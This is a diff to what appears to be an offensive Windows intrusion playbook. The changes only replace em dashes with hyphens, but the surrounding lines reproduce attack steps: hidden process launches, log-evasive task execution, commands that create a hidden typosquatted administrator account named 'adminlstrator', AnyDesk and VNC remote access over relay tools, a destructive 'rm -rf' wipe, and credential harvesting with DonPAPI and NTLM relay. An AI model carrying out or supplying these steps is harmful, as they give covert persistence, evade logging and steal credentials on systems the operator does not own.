@@ -34,7 +34,7 @@ Start-Process service.exe -WindowStyle Hidden
 Start-Process -FilePath "C:\Path\To\App.exe" -ArgumentList "param1", "param2", "-flag" -WindowStyle Hidden
 ```
 
-## 5. atexec — Log-Evasive Execution
+## 5. atexec - Log-Evasive Execution
 Use atexec-pro for execution without appearing in standard logs. Remember:
 - Select command interpreter
 - Patch task time after installation for stealth
@@ -73,7 +73,7 @@ ps_exec 'net localgroup Administrators adminlstrator /ADD'
 ps_exec 'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v adminlstrator /t REG_DWORD /d 0 /f'
 ps_exec 'cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id'
 ```
-Note: `adminlstrator` (with L not I) — typosquatting the real Administrator.
+Note: `adminlstrator` (with L not I) - typosquatting the real Administrator.
 
 ## 9. UltraVNC via GS-NetCat/QSocket
 Upload files, install service, connect:
@@ -138,6 +138,6 @@ rm -rf !(index.php)
 | qsocket | Encrypted relay | https://qsocket.io |
 
 ## 13. Domain Recon
-- **BloodHound** — AD relationship mapping
-- **DonPAPI** — credential harvesting from DPAPI
-- **DNS/NTLM relay** — for initial access or privilege escalation
+- **BloodHound** - AD relationship mapping
+- **DonPAPI** - credential harvesting from DPAPI
+- **DNS/NTLM relay** - for initial access or privilege escalation
